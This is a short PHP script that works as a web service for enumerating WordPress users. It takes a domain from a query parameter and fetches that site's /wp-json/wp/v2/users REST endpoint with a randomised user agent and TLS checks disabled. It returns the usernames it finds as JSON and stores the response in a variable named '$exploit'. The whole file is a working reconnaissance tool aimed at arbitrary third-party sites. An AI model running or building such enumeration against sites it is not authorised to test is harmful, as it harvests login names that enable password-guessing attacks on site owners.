<?php

ob_flush();
header('Content-type: application/json');
error_reporting(0);

include 'random-useragent.php';

function curl($url)
{
    $setopt = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 60,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_USERAGENT => getUserAgent(),
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => false
    );
    $ch = curl_init();
    curl_setopt_array($ch, $setopt);
    $exe = curl_exec($ch);
    curl_close($ch);
    return $exe;
}

if (!empty($_GET['domain'])) {
    $domain = htmlspecialchars($_GET['domain']);
    $url = (!preg_match('#^http(s)?://#', $domain)) ? "http://$domain" : $domain;

    $exploit = curl(htmlspecialchars("$url/wp-json/wp/v2/users"));
    $decode = json_decode($exploit, true);
    $api = [];

    if (count($decode) > 0) {
        for ($i = 0; $i < count($decode); $i++) {
            $api['status'] = 'success';
            $api['site'] = $url;
            $api['user ' . ($i + 1)] = $decode[$i]['name'];
        }
    } else {
        $api['status'] = 'failed';
        $api['result'] = 'forbidden';
    }
    echo json_encode($api, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
} else {
    $api['error'] = 'param domain empty';
    echo json_encode($api, JSON_PRETTY_PRINT);
}
